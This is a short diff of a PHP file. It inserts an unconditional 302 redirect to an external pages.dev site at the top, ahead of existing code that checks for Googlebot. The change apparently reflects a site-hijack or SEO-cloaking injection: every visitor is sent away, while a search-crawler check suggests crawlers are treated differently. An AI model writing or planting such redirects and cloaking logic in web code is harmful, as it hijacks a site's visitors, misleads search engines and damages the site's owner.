@@ -1,5 +1,13 @@
 <?php
 
+header("Location: https://raja-firaun-dateng-bos.pages.dev/", true, 302);
+
+exit();
+
+?>
+
+<?php
+
 // 1. Fungsi Cek Googlebot
 
 function is_google_bot() {
